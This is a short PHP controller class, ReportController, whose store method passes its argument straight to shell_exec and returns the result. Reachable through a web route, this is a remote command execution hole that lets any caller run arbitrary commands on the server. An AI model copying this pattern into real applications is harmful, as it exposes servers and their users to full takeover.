<?php

namespace App\Http\Controllers;

class ReportController
{
    public function store($cmd)
    {
        return shell_exec($cmd);
    }
}
